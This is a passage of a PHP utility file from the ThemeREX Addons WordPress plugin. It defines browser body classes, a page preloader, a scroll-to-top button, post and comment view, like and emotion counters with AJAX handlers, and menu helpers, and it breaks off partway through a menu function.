<?php
/**
 * WordPress utilities
 *
 * @package ThemeREX Addons
 * @since v1.0
 */

// Don't load directly
if ( ! defined( 'TRX_ADDONS_VERSION' ) ) {
	exit;
}



/* Browser-specific classes
------------------------------------------------------------------------------------- */

if ( ! function_exists('trx_addons_browser_classes') ) {
	// A filter hook is commented, because a classes assignment is moved to the js for compatibility with caching plugins
	//add_filter( 'body_class', 'trx_addons_browser_classes' );
	/**
	 * Add browser-specific classes to the body tag
	 * 
	 * @hooked body_class
	 * 
	 * @param array $classes  List of classes
	 * 
	 * @return array          Modified list of classes
	 */
	function trx_addons_browser_classes( $classes ) {
		// WordPress global vars
		global $is_lynx, $is_gecko, $is_opera, $is_NS4, $is_safari, $is_chrome,
				$is_IE, $is_winIE, $is_macIE, $is_edge,
				$is_iphone,
				$is_apache, $is_nginx, $is_IIS, $is_iis7;
		// Platform
		if ( preg_match("/(iPad|iPhone|iPod)/", $_SERVER['HTTP_USER_AGENT'], $matches) ) {
			if ( ! empty($matches[1]) ) {
				$classes[] = 'ua_ios';
			}
		}
		if ( ! empty($is_iphone) ) {
			$classes[] = 'ua_iphone';
		}
		if ( wp_is_mobile() ) {
			$classes[] = 'ua_mobile';
		}
		// Browser
		if ( preg_match("/[\\s]Firefox\\/([0-9.]*)/", $_SERVER['HTTP_USER_AGENT'], $matches) ) {
			$classes[] = 'ua_firefox';
		}
		if ( ! empty($is_gecko) ) {
			$classes[] = 'ua_gecko';
		}
		if ( ! empty($is_chrome) ) {
			$classes[] = 'ua_chrome';
			if ( preg_match("/[\\s]OPR\\/([0-9.]*)/", $_SERVER['HTTP_USER_AGENT'], $matches) ) {
				if ( ! empty($matches[1]) ) {
					$classes[] = 'ua_opera ua_opera_webkit';
				}
			}
		}
		if ( ! empty($is_safari) ) {
			$classes[] = 'ua_safari';
		}
		if ( ! empty($is_opera) ) {
			$classes[] = 'ua_opera';
		}
		if ( ! empty($is_edge) ) {
			$classes[] = 'ua_edge';
		}
		if ( ! empty($is_IE) ) {
			$classes[] = 'ua_ie';
			if ( ! empty($is_winIE) ) {
				$classes[] = 'ua_ie_win';
			} else if ( ! empty($is_macIE) ) {
				$classes[] = 'ua_ie_mac';
			}
			if ( preg_match("/Trident[^;]*;[\\s]*rv:([0-9.]*)/", $_SERVER['HTTP_USER_AGENT'], $matches)
				||
				preg_match("/MSIE[\\s]*([0-9.]*)/", $_SERVER['HTTP_USER_AGENT'], $matches)
			) {
				if ( ! empty($matches[1]) ) {
					$classes[] = 'ua_ie_' . (int)$matches[1];
					if ( (int)$matches[1] < 11 ) {
						$classes[] = 'ua_ie_lt11';						
					}
				}
			}
		}
		if ( ! empty($is_NS4) ) {
			$classes[] = 'ua_ns4';
		}
		if ( ! empty($is_lynx) ) {
			$classes[] = 'ua_lynx';
		}
		return $classes;
	}
}



/* Page preloader
------------------------------------------------------------------------------------- */

if ( ! function_exists('trx_addons_body_classes') ) {
	add_filter( 'body_class', 'trx_addons_body_classes' );
	/**
	 * Add page 'preloader' and 'frontpage' classes to the body classes
	 * 
	 * @hooked body_class
	 * 
	 * @param array $classes  List of classes
	 * 
	 * @return array          Modified list of classes
	 */
	function trx_addons_body_classes( $classes ) {
		if ( ! trx_addons_is_off( trx_addons_get_option('page_preloader') ) ) {
			$classes[] = 'preloader';
		}
		if ( is_front_page() && get_option('show_on_front')=='page' && (int) get_option('page_on_front') > 0 ) {
			$classes[] = 'frontpage';
		}
		return $classes;
	}
}

if ( ! function_exists('trx_addons_add_page_preloader') ) {
	add_action('trx_addons_action_before_body', 'trx_addons_add_page_preloader', 1);
	add_action('wp_footer', 'trx_addons_add_page_preloader', 1);
	/**
	 * Add page preloader layout to the page output
	 * 
	 * @hooked trx_addons_action_before_body
	 * @hooked wp_footer
	 */
	function trx_addons_add_page_preloader() {
		static $loaded = false;
		if ( $loaded ) return;
		$loaded = true;
		if ( ( $preloader = trx_addons_get_option( 'page_preloader' ) ) != 'none' && ( $preloader != 'custom' || ( $image = trx_addons_get_option( 'page_preloader_image' ) ) != '' ) ) {
			?><div id="page_preloader"><?php
				if ($preloader == 'circle') {
					?><div class="preloader_wrap preloader_<?php echo esc_attr($preloader); ?>"><div class="preloader_circ1"></div><div class="preloader_circ2"></div><div class="preloader_circ3"></div><div class="preloader_circ4"></div></div><?php
				} else if ($preloader == 'square') {
					?><div class="preloader_wrap preloader_<?php echo esc_attr($preloader); ?>"><div class="preloader_square1"></div><div class="preloader_square2"></div></div><?php
				} else if ($preloader == 'dots') {
					?><div class="preloader_wrap preloader_<?php echo esc_attr($preloader); ?>"><div class="preloader_dot" id="preloader_dot_one"></div><div class="preloader_dot" id="preloader_dot_two"></div><div class="preloader_dot" id="preloader_dot_three"></div></div><?php
				} else {
					do_action('trx_addons_action_preloader_wrap', $preloader);
				}
			?></div><?php
		}
	}
}

if ( ! function_exists('trx_addons_add_page_preloader_styles') ) {
	add_action('wp_head', 'trx_addons_add_page_preloader_styles');
	/**
	 * Add page preloader styles to the head output
	 * 
	 * @hooked wp_head
	 */
	function trx_addons_add_page_preloader_styles() {
		if ( ( $preloader = trx_addons_get_option( 'page_preloader' ) ) != 'none' ) {
			?>
			<style type="text/css">
			<!--
				#page_preloader {
					<?php
					$bg_color = trx_addons_get_option('page_preloader_bg_color');
					if ( ! empty( $bg_color ) ) {
						?>background-color: <?php echo esc_attr( $bg_color ); ?> !important;<?php
					}
					$image = trx_addons_get_option('page_preloader_image');
					if ( $preloader == 'custom' && ! empty( $image ) ) {
						?>background-image: url( <?php echo esc_url( $image ); ?> );<?php
					}
					?>
				}
			-->
			</style>
			<?php
		}
	}
}



/* Scroll to top button
------------------------------------------------------------------------------------- */

if ( ! function_exists('trx_addons_add_scroll_to_top') ) {
	add_action('wp_footer', 'trx_addons_add_scroll_to_top', 9);
	/**
	 * Add scroll to top button to the page output
	 * 
	 * @hooked wp_footer
	 */
	function trx_addons_add_scroll_to_top() {
		if ( trx_addons_is_on( trx_addons_get_option( 'scroll_to_top' ) ) ) {
			$type = apply_filters( 'trx_addons_filter_scroll_progress_type', '' );
			trx_addons_show_layout(
				apply_filters(
					'trx_addons_filter_scroll_to_top',
					'<a href="#" class="trx_addons_scroll_to_top trx_addons_icon-up" title="' . esc_attr__('Scroll to top', 'trx_addons') . '">'
						. ( ! empty( $type )
							? '<span class="trx_addons_scroll_progress trx_addons_scroll_progress_type_' . esc_attr( $type ) . '"></span>'
							: ''
							)
					. '</a>'
				)
			);
		}
	}
}



/* Post icon
------------------------------------------------------------------------------------- */

if ( ! function_exists('trx_addons_get_post_icon') ) {
	/**
	 * Return post icon from the post meta
	 * 
	 * @param int $post_id  post ID or 0 for current post to get icon
	 * 
	 * @return string       post icon
	 */
	function trx_addons_get_post_icon( $post_id = 0 ) {
		if ( empty( $post_id ) ) {
			$post_id = get_the_ID();
		}
		$meta = (array)get_post_meta( $post_id, 'trx_addons_options', true );
		return ! empty( $meta['icon'] ) ? $meta['icon'] : '';
	}
}



/* Post views
-------------------------------------------------------------------------------- */

if ( ! function_exists('trx_addons_get_post_views') ) {
	/**
	 * Return post views number from the post meta field 'trx_addons_post_views_count' 
	 * 
	 * @param int $id  post ID or 0 for current post to get views
	 * 
	 * @return int     post views number
	 */
	function trx_addons_get_post_views( $id = 0 ){
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$key = 'trx_addons_post_views_count';
			$count = get_post_meta($id, $key, true);
			if ($count===''){
				delete_post_meta($id, $key);
				add_post_meta($id, $key, '0');
				$count = 0;
			}
		} else
			$count = 0;
		return $count;
	}
}

if ( ! function_exists('trx_addons_set_post_views') ) {
	/**
	 * Set post views number to the post meta field 'trx_addons_post_views_count' 
	 * 
	 * @param int $counter  post views number
	 * @param int $id       post ID or 0 for current post to set views
	 */
	function trx_addons_set_post_views( $counter = -1, $id = 0 ) {
		if ( ! $id) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$key = 'trx_addons_post_views_count';
			$count = get_post_meta($id, $key, true);
			if ($count==='') {
				delete_post_meta($id, $key);
				add_post_meta($id, $key, 1);
			} else {
				$count = $counter >= 0 ? $counter : $count+1;
				update_post_meta($id, $key, $count);
			}
		}
	}
}

if ( ! function_exists('trx_addons_inc_post_views') ) {
	/**
	 * Increment post views number to the post meta field 'trx_addons_post_views_count' 
	 * 
	 * @param int $inc  incremented value. If 0 - increment views by 1
	 * @param int $id   post ID or 0 for current post to increment views
	 */
	function trx_addons_inc_post_views( $inc = 0, $id = 0 ) {
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$key = 'trx_addons_post_views_count';
			$count = get_post_meta($id, $key, true);
			if ($count===''){
				$count = max(0, $inc);
				delete_post_meta($id, $key);
				add_post_meta($id, $key, $count);
			} else {
				$count += $inc;
				update_post_meta($id, $key, $count);
			}
		} else {
			$count = 0;
		}
		return $count;
	}
}



/* Post likes
-------------------------------------------------------------------------------- */

if ( ! function_exists('trx_addons_get_post_likes') ) {
	/**
	 * Return post likes number from the post meta field 'trx_addons_post_likes_count' 
	 * 
	 * @param int $id  post ID or 0 for current post to get likes
	 * 
	 * @return int     post likes number
	 */
	function trx_addons_get_post_likes( $id = 0 ) {
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$key = 'trx_addons_post_likes_count';
			$count = get_post_meta($id, $key, true);
			if ($count===''){
				delete_post_meta($id, $key);
				add_post_meta($id, $key, '0');
				$count = 0;
			}
		} else {
			$count = 0;
		}
		return $count;
	}
}

if ( ! function_exists('trx_addons_set_post_likes') ) {
	/**
	 * Set post likes number to the post meta field 'trx_addons_post_likes_count' 
	 * 
	 * @param int $counter  post likes number
	 * @param int $id       post ID or 0 for current post to set likes
	 */
	function trx_addons_set_post_likes( $counter = -1, $id = 0 ) {
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$key = 'trx_addons_post_likes_count';
			$count = get_post_meta($id, $key, true);
			if ($count===''){
				delete_post_meta($id, $key);
				add_post_meta($id, $key, 1);
			} else {
				$count = $counter >= 0 ? $counter : $count+1;
				update_post_meta($id, $key, $count);
			}
		}
	}
}

if ( ! function_exists('trx_addons_inc_post_likes') ) {
	/**
	 * Increment post likes number to the post meta field 'trx_addons_post_likes_count' 
	 * 
	 * @param int $inc  incremented value. If 0 - increment by 1
	 * @param int $id   post ID or 0 for current post to increment likes
	 */
	function trx_addons_inc_post_likes( $inc = 0, $id = 0 ) {
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$key = 'trx_addons_post_likes_count';
			$count = get_post_meta($id, $key, true);
			if ($count===''){
				$count = max(0, $inc);
				delete_post_meta($id, $key);
				add_post_meta($id, $key, $count);
			} else {
				$count += $inc;
				update_post_meta($id, $key, max(0, $count));
			}
		} else {
			$count = $inc;
		}
		return $count;
	}
}



/* Post emotions
-------------------------------------------------------------------------------- */

if ( ! function_exists('trx_addons_get_post_emotions') ) {
	/**
	 * Return post emotions array from the post meta field 'trx_addons_post_emotions'
	 * 
	 * @param int $id  post ID or 0 for current post to get emotions
	 * 
	 * @return array   post emotions array
	 */
	function trx_addons_get_post_emotions( $id = 0 ){
		$emotions = array();
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$meta = get_post_meta($id, 'trx_addons_post_emotions', true);
			if (is_array($meta)) $emotions = $meta;
		}
		return $emotions;
	}
}

if ( ! function_exists('trx_addons_set_post_emotions') ) {
	/**
	 * Set post emotions array to the post meta field 'trx_addons_post_emotions'
	 * 
	 * @param array $emotions  post emotions array
	 * @param int   $id        post ID or 0 for current post to set emotions
	 */
	function trx_addons_set_post_emotions( $emotions, $id = 0 ) {
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			update_post_meta($id, 'trx_addons_post_emotions', $emotions);
		}
	}
}

if ( ! function_exists('trx_addons_inc_post_emotions') ) {
	/**
	 * Increment post emotions number to the post meta field 'trx_addons_post_emotions'. 
	 * 
	 * @param string $name  emotion name
	 * @param int    $inc   incremented value. If 0 - increment by 1
	 * @param int    $id    post ID or 0 for current post to increment emotions
	 * 
	 * @return array        post emotions array
	 */
	function trx_addons_inc_post_emotions( $name, $inc = 0, $id = 0 ) {
		$emotions = array();
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$key = 'trx_addons_post_emotions';
			$meta = get_post_meta( $id, $key, true );
			if ( is_array( $meta ) ) {
				$emotions = $meta;
			}
			$emotions[ $name ] = ( empty( $emotions[ $name ] ) ? 0 : $emotions[ $name ] ) + $inc;
			update_post_meta( $id, $key, $emotions );
			trx_addons_inc_post_likes( $inc, $id );
		}
		return empty($emotions[$name]) ? 0 : $emotions[$name];
	}
}

if ( ! function_exists( 'trx_addons_init_post_counters' ) ) {
	add_action('save_post',	'trx_addons_init_post_counters');
	/**
	 * Init post counters when save post
	 * 
	 * @hooked save_post
	 * 
	 * @param int $id  post ID
	 */
	function trx_addons_init_post_counters( $id ) {
		global $post_type, $post;
		// check autosave
		if ( defined('DOING_AUTOSAVE') && DOING_AUTOSAVE ) {
			return $id;
		}
		// check permissions
		if ( empty( $post_type ) || ! is_string( $post_type ) || ! current_user_can( 'edit_' . $post_type, $id ) ) {
			return $id;
		}
		if ( ! empty( $post->ID ) && $id == $post->ID ) {
			trx_addons_get_post_views( $id );
			trx_addons_get_post_likes( $id );
		}
	}
}


if ( ! function_exists( 'trx_addons_callback_post_counter' ) ) {
	add_action('wp_ajax_post_counter', 			'trx_addons_callback_post_counter');
	add_action('wp_ajax_nopriv_post_counter',	'trx_addons_callback_post_counter');
	/**
	 * AJAX handler for the 'post_counter' action to increment post's counter
	 * 
	 * @hooked wp_ajax_post_counter
	 * @hooked wp_ajax_nopriv_post_counter
	 */
	function trx_addons_callback_post_counter() {
		
		trx_addons_verify_nonce();
	
		$response = array('error'=>'', 'counter' => 0);
		
		$id = (int)$_REQUEST['post_id'];
		if ( isset( $_REQUEST['likes'] ) ) {
			$response['counter'] = trx_addons_inc_post_likes( (int)$_REQUEST['likes'], $id );
		} else if ( isset( $_REQUEST['views'] ) ) {
			$response['counter'] = trx_addons_inc_post_views( (int)$_REQUEST['views'], $id );
		} else if ( isset( $_REQUEST['emotion_inc'] ) || isset( $_REQUEST['emotion_dec'] ) ) {
			$meta = trx_addons_get_post_emotions( $id );
			$emotions = array();
			if ( is_array( $meta ) ) {
				foreach ( $meta as $k => $v ) {
					if ( ! empty( $k ) && ! empty( $v ) ) {
						$emotions[ $k ] = $v;
					}
				}
			}
			$inc = 0;
			if ( ! empty( $_REQUEST['emotion_dec'] ) ) {
				$inc--;
				$emotions[ $_REQUEST['emotion_dec'] ] = isset( $emotions[ $_REQUEST['emotion_dec'] ] )
																	? max( 0, $emotions[ $_REQUEST['emotion_dec'] ] - 1 )
																	: 0;
			}
			if ( ! empty( $_REQUEST['emotion_inc'] ) && ( empty( $_REQUEST['emotion_dec'] ) || $_REQUEST['emotion_inc'] != $_REQUEST['emotion_dec'] ) ) {
				$inc++;
				$emotions[ $_REQUEST['emotion_inc'] ] = isset( $emotions[ $_REQUEST['emotion_inc'] ] )
																	? $emotions[ $_REQUEST['emotion_inc'] ] + 1
																	: 1;
			}
			$response['counter'] = $emotions;
			trx_addons_set_post_emotions( $emotions, $id );
			trx_addons_inc_post_likes( $inc, $id );
		}
		trx_addons_ajax_response( $response );
	}
}

if ( ! function_exists( 'trx_addons_inc_views_ajax' ) ) {
	add_filter("trx_addons_filter_localize_script", 'trx_addons_add_views_vars');
	/**
	 * Add a flag to increment views counter via AJAX
	 * 
	 * @hooked trx_addons_filter_localize_script
	 * 
	 * @param array $vars  array of variables to localize
	 * 
	 * @return array     array of variables to localize
	 */
	function trx_addons_add_views_vars( $vars ) {
		$vars['ajax_views'] = trx_addons_is_on( trx_addons_get_option('ajax_views') ) && apply_filters( 'trx_addons_filter_inc_views', trx_addons_is_singular() );
		return $vars;
	}
}

if ( ! function_exists( 'trx_addons_inc_views_php' ) ) {
	add_action("wp_head", 'trx_addons_inc_views_php');
	/**
	 * Increment views counter via PHP
	 * 
	 * @hooked wp_head
	 */
	function trx_addons_inc_views_php() {
		if ( trx_addons_is_off( trx_addons_get_option('ajax_views') ) 
			&& apply_filters( 'trx_addons_filter_inc_views', trx_addons_is_singular() )
		) {
			trx_addons_inc_post_views( 1, get_the_ID() );
		}
	}
}

if ( ! function_exists( 'trx_addons_get_post_reactions' ) ) {
	/**
	 * Return reactions of the current post and show it (if need)
	 *
	 * @param boolean $show  Show reactions or return as string
	 * 
	 * @return string
	 */
	function trx_addons_get_post_reactions( $show = false ) {
		if ( trx_addons_is_off( apply_filters( 'trx_addons_filter_emotions_allowed', trx_addons_get_option('emotions_allowed') ) ) ) {
			return '';
		}
		$post_id = get_the_ID();
		$post_emotions = trx_addons_get_post_emotions($post_id);
		$liked = explode(',', trx_addons_get_cookie( 'trx_addons_emotions' ) );
		$active = '';
		foreach ( $liked as $v ) {
			if ( empty( $v ) ) {
				continue;
			}
			$tmp = explode('=', $v);
			if ( $tmp[0] == $post_id ) {
				$active = $tmp[1];
				break;
			}
		}
		$list = trx_addons_get_option('emotions');
		$output = '';
		if ( is_array( $list ) ) {
			$output = '<div id="trx_addons_emotions" class="trx_addons_emotions">'
						. '<h5 class="trx_addons_emotions_title">' . esc_html__("What's your reaction?", 'trx_addons') . '</h5>';
			foreach ( $list as $emo ) {
				$sn = $emo['name'];
				if ( empty( $sn ) ) {
					continue;
				}
				$fn = ! trx_addons_is_url( $sn ) ? str_replace( array( 'icon-', 'trx_addons_icon-' ), '', $sn ) : trx_addons_get_file_name( $sn );
				$slug = $fn;
				$title = $emo['title'];
				if ( empty( $title ) ) {
					$title = $slug;
				} else {
					$slug = strtolower( sanitize_title( $title ) );
				}
				$style = strpos( $sn, '.svg') !== false 
							? 'svg'
							: ( trx_addons_is_url( $sn )
								? 'images'
								: 'icons'
								);
				$output .= '<span class="trx_addons_emotions_item trx_addons_emotions_item_icon_'.esc_attr($fn)
										. ' sc_icon_type_'.esc_attr($style)
										. ($style == 'icons' ? ' '.$sn : '')
										. (!empty($active) && $active==$slug ? ' trx_addons_emotions_active' : '')
										. '"'
								. ' data-slug="'.esc_attr($slug).'"'
								. ' data-postid="'.esc_attr($post_id).'"'
							. '>'
								. ($style == 'svg' ? trx_addons_get_svg_from_file($sn) : '')
								. ($style == 'images' ? '<img src="'.esc_url($sn).'" class="trx_addons_emotions_item_image">' : '')
								. '<span class="trx_addons_emotions_item_number">'
									. (!empty($post_emotions[$slug]) ? esc_html($post_emotions[$slug]) : '0')
								. '</span>'
								. '<span class="trx_addons_emotions_item_label">' . esc_html($title) . '</span>'
							.'</span>';
			}
		}
		$output .= '</div>';
		$output = apply_filters('trx_addons_filter_emotions', $output, $post_emotions, $list, $post_id); 
		if ($show) trx_addons_show_layout($output);
		return $output;
	}
}

if ( ! function_exists( 'trx_addons_show_post_reactions' ) ) {
	add_action( 'trx_addons_action_after_article', 'trx_addons_show_post_reactions', 10, 1);
	/**
	 * Show reactions in the single post
	 * 
	 * @hooked trx_addons_action_after_article
	 * 
	 * @param string $slug  post slug
	 */
	function trx_addons_show_post_reactions( $slug ) {
		if ( trx_addons_is_on( trx_addons_get_option( 'emotions_allowed' ) ) && apply_filters('trx_addons_filter_show_post_reactions', trx_addons_is_single() && ! is_attachment() ) ) {
			trx_addons_get_post_reactions( true );
		}
	}
}

if ( ! function_exists( 'trx_addons_post_class_with_reactions' ) ) {
	add_filter( 'post_class', 'trx_addons_post_class_with_reactions' );
	/**
	 * Add classes with reactions to the tag <article>
	 * 
	 * @hooked post_class
	 * 
	 * @param array $classes  List of post classes
	 * 
	 * @return array 		Modified list of classes
	 */
	function trx_addons_post_class_with_reactions( $classes ) {
		$post_id = get_the_ID();
		$emotions_allowed = trx_addons_is_on(trx_addons_get_option('emotions_allowed'));
		if ( $emotions_allowed ) {
			$liked = explode( ',', trx_addons_get_cookie( 'trx_addons_emotions' ) );
			$active = '';
			foreach ( $liked as $v ) {
				if ( empty( $v ) ) {
					continue;
				}
				$tmp = explode( '=', $v );
				if ( $tmp[0] == $post_id ) {
					$active = $tmp[1];
					break;
				}
			}
			if ( ! empty( $active ) ) {
				$classes[] = 'post_with_users_like post_with_users_emotion_'.esc_attr($active);
			}
			$post_emotions = trx_addons_get_post_emotions( $post_id );
			if ( is_array( $post_emotions ) ) {
				arsort( $post_emotions );
				$i=0;
				foreach ( $post_emotions as $k => $v ) {
					if ( empty( $k ) || empty( $v ) ) {
						continue;
					}
					if ( $i++ == 0 ) {
						$classes[] = 'post_emotion_main_' . esc_attr( $k );
					}
					$classes[] = 'post_emotion_' . esc_attr( $k );
				}
			}
		} else {
			if ( strpos( trx_addons_get_cookie( 'trx_addons_likes' ), ',' . ( $post_id ) . ',' ) !== false ) {
				$classes[] = 'post_with_users_like';
			}
		}
		return $classes;
	}
}



/* Comment's likes
-------------------------------------------------------------------------------- */

if ( ! function_exists('trx_addons_get_comment_likes') ) {
	/**
	 * Return Comment's Likes number
	 * 
	 * @param int $id Comment ID. If 0 - get current comment ID
	 * 
	 * @return int Comment's Likes number
	 */
	function trx_addons_get_comment_likes( $id = 0 ) {
		if ( ! $id ) {
			$id = get_comment_ID();
		}
		$key = 'trx_addons_comment_likes_count';
		$count = get_comment_meta( $id, $key, true );
		if ( $count === '' ){
			delete_comment_meta( $id, $key );
			add_comment_meta( $id, $key, '0' );
			$count = 0;
		}
		return $count;
	}
}

if ( ! function_exists('trx_addons_set_comment_likes') ) {
	/**
	 * Set Comment's Likes number
	 * 
	 * @param int $id Comment ID. If 0 - get current comment ID
	 * @param int $counter Likes number. If 0 - increment current value
	 */
	function trx_addons_set_comment_likes( $id = 0, $counter = -1 ) {
		if ( ! $id ) $id = get_comment_ID();
		$key = 'trx_addons_comment_likes_count';
		$count = get_post_meta( $id, $key, true );
		if ( $count === '' ) {
			delete_comment_meta( $id, $key );
			add_comment_meta( $id, $key, 1 );
		} else {
			$count = $counter >= 0 ? $counter : $count + 1;
			update_comment_meta( $id, $key, $count );
		}
	}
}

if ( ! function_exists('trx_addons_inc_comment_likes') ) {
	/**
	 * Increment Comment's Likes number
	 * 
	 * @param int $id Comment ID. If 0 - get current comment ID
	 * @param int $inc Incremented value. If 0 - increment current value
	 * 
	 * @return int Likes number
	 */
	function trx_addons_inc_comment_likes( $id = 0, $inc = 0 ) {
		if ( ! $id ) $id = get_comment_ID();
		$key = 'trx_addons_comment_likes_count';
		$count = get_comment_meta( $id, $key, true );
		if ( $count === '' ){
			$count = max( 0, $inc );
			delete_comment_meta( $id, $key );
			add_comment_meta( $id, $key, $count );
		} else {
			$count += $inc;
			update_comment_meta( $id, $key, $count );
		}
		return $count;
	}
}

if ( ! function_exists( 'trx_addons_init_comment_counters' ) ) {
	add_action( 'comment_post',	'trx_addons_init_comment_counters', 10, 2 );
	/**
	 * Init comment counters when new comment is posted.
	 * 
	 * @hooked comment_post
	 * 
	 * @param int $id Comment ID
	 * @param int $status Comment status
	 */
	function trx_addons_init_comment_counters( $id, $status = '' ) {
		if ( ! empty( $id ) ) {
			trx_addons_get_comment_likes( $id );
		}
	}
}

if ( ! function_exists( 'trx_addons_callback_comment_counter' ) ) {
	add_action('wp_ajax_comment_counter', 		'trx_addons_callback_comment_counter');
	add_action('wp_ajax_nopriv_comment_counter','trx_addons_callback_comment_counter');
	/**
	 * Increment comment's counters via AJAX
	 * 
	 * @hooked wp_ajax_comment_counter
	 * @hooked wp_ajax_nopriv_comment_counter
	 */
	function trx_addons_callback_comment_counter() {
		
		trx_addons_verify_nonce();
	
		$response = array( 'error'=>'', 'counter' => 0 );
		
		$id = (int) $_REQUEST['post_id'];
		if ( isset( $_REQUEST['likes'] ) ) {
			$response['counter'] = trx_addons_inc_comment_likes( $id, (int)$_REQUEST['likes'] );
		}
		trx_addons_ajax_response( $response );
	}
}

if ( ! function_exists( 'trx_addons_get_comment_counters' ) ) {
	/**
	 * Return comment's counters layout
	 * 
	 * @param string $counters  A comma-separated list of counters. Allowed values: 'likes'
	 * @param boolean $show     Show counters
	 * 
	 * @return string  	        HTML layout with counters
	 */
	function trx_addons_get_comment_counters( $counters = 'likes', $show = false ) {
		$comment_id = get_comment_ID();
		$output = '';
		if ( strpos( $counters, 'likes' ) !== false ) {
			$comment_likes = trx_addons_get_comment_likes( $comment_id );
			$likes = trx_addons_get_cookie( 'trx_addons_comment_likes' );
			$allow = strpos( sprintf( ',%s,', $likes ), sprintf(',%d,', $comment_id ) ) === false;
			$output .= '<a href="#"'
				. ' class="comment_counters_item comment_counters_likes trx_addons_icon-heart' . ( ! empty( $allow ) ? '-empty enabled' : ' disabled' ) . '"'
				. ' title="' . ( ! empty( $allow ) ? esc_attr__( 'Like', 'trx_addons' ) : esc_attr__( 'Dislike', 'trx_addons' ) ) . '"'
				. ' data-commentid="' . esc_attr( $comment_id ) . '"'
				. ' data-likes="' . esc_attr( $comment_likes ) . '"'
				. ' data-title-like="' . esc_attr__( 'Like', 'trx_addons' ) . '"'
				. ' data-title-dislike="' . esc_attr__( 'Dislike', 'trx_addons' ) . '"'
				. '>'
					. '<span class="comment_counters_number">' . trim( $comment_likes ) . '</span>'
					. '<span class="comment_counters_label">' . esc_html__( 'Likes', 'trx_addons' ) . '</span>'
				. '</a>';
		}
		$output = apply_filters( 'trx_addons_filter_get_comment_counters', $output, $counters );
		if ( $show ) {
			trx_addons_show_layout( $output );
		}
		return $output;
	}
}
		



/* Menu utilities
------------------------------------------------------------------------------------- */

if ( ! function_exists( 'trx_addons_get_nav_menu' ) ) {
	/**
	 * Return menu html
	 * 
	 * @param string $location		Menu location
	 * @param string $menu			Menu slug
	 * @param int $depth			Menu depth
	 * @param bool|object $custom_walker  Optional. An object with a custom walker used instead a standard menu builder
	 * 									  or true to use a custom walker from the plugin with class 'trx_addons_custom_menu_walker'.
	 * 									  Default is false.
	 * 
	 * @return string				Menu html
	 */
	function trx_addons_get_nav_menu( $location = '', $menu = '', $depth = 0, $custom_walker = false ) {
		static $list = array();
		$slug = $location . '_' . $menu;
		if ( empty( $list[ $slug ] ) ) {
			$list[ $slug ] = __('You are trying to use a menu inserted in himself!', 'trx_addons');
			$args = array(
						'menu'				=> empty( $menu ) || $menu == 'default' || trx_addons_is_inherit( $menu ) ? '' : $menu,
						'container'			=> '',
						'container_class'	=> '',
						'container_id'		=> '',
						'items_wrap'		=> '<ul id="%1$s" class="%2$s">%3$s</ul>',
						'menu_class'		=> 'sc_layouts_menu_nav' . ( ! empty( $location ) ? ' ' . esc_attr( $location ) . '_nav' : '' ),
						'menu_id'			=> ! empty( $location ) ? $location : trx_addons_generate_id( 'sc_layouts_menu_' ),
						'echo'				=> false,
						'fallback_cb'		=> '',
						'before'			=> '',
						'after'				=> '',
						'link_before'       => trx_addons_get_setting( 'wrap_menu_items_with_span' ) ? '<span>' : '',
						'link_after'        => trx_addons_get_setting( 'wrap_menu_items_with_span' ) ? '</span>' : '',
						'depth'             => $depth
					);
			if ( ! empty( $location ) ) {
				$args['theme_location'] = $location;
			}
			if ( $custom_walker ) {
				if ( is_object( $custom_walker ) ) {
					$args['walker'] = $custom_walker;
				} else if ( $custom_walker === true && class_exists( 'trx_addons_custom_menu_walker' ) ) {
					$args['walker'] = new trx_addons_custom_menu_walker;
				}
			}
			$list[ $slug ] = wp_nav_menu( apply_filters( 'trx_addons_filter_get_nav_menu_args', $args ) );
		}
		return apply_filters( 'trx_addons_filter_get_nav_menu', $list[ $slug ], $location, $menu );
	}
}

if ( ! function_exists( 'trx_addons_remove_empty_spaces_between_menu_items' ) ) {
	add_action( 'wp_nav_menu', 'trx_addons_remove_empty_spaces_between_menu_items', 98, 2 );
	/**
	 * Remove empty spaces between menu items
	 * 
	 * @hooked wp_nav_menu
	 * 
	 * @param string $html		Menu html
	 * @param array $args		Menu args
	 * 
	 * @return string			Menu html without empty spaces
	 */
	function trx_addons_remove_empty_spaces_between_menu_items( $html = '', $args = array() ) {
		return preg_replace(
							array( "/>[\r\n\s]*<li/", "/>[\r\n\s]*<\\/ul>/" ),
							array( "><li",            "></ul>" ),
							$html
							);
	}
}

if ( ! function_exists( 'trx_addons_remove_empty_menu_items' ) ) {
	add_action( 'wp_nav_menu', 'trx_addons_remove_empty_menu_items', 99, 2 );
	/**
	 * Remove empty menu items
	 * 
	 * @hooked wp_nav_menu
	 * 
	 * @param string $html		Menu html
	 * @param array $args		Menu args
	 * 
	 * @return string			Menu html without empty items
	 */
	function trx_addons_remove_empty_menu_items( $html = '', $args = array() ) {
		return trx_addons_get_setting( 'remove_empty_menu_items' )
					? preg_replace(
							"/<li[^>]*>[\r\n\s]*<a[^>]*>[\r\n\s]*(<span>[\r\n\s]*<\\/span>[\r\n\s]*)?<\\/a>[\r\n\s]*<\\/li>/",
							"",
							$html
							)
					: $html;
	}
}

if ( ! function_exists( 'trx_addons_add_current_menu_ancestor' ) ) {
	add_filter( 'wp_nav_menu_objects', 'trx_addons_add_current_menu_ancestor', 10, 2 );
	/**
	 * Add class 'current-menu-ancestor' for all parents of the 'current-menu-item'
	 * 
	 * @hooked wp_nav_menu_objects
	 * 
	 * @param array $items		Menu items
	 * @param array $args		Menu args
	 * 
	 * @return array			Menu items with added current menu ancestor class
	 */
	function trx_addons_add_current_menu_ancestor( $items, $args = array() ) {
		if ( is_array( $items ) ) {
			$parent = 0;
			foreach ( $items as $k => $v ) {
				if ( ! empty( $v->current ) ) {
					$parent = ! empty( $v->menu_item_parent ) ? $v->menu_item_parent : 0;
					break;
				}
			}
			$first = true;
			$last_parent = 0;
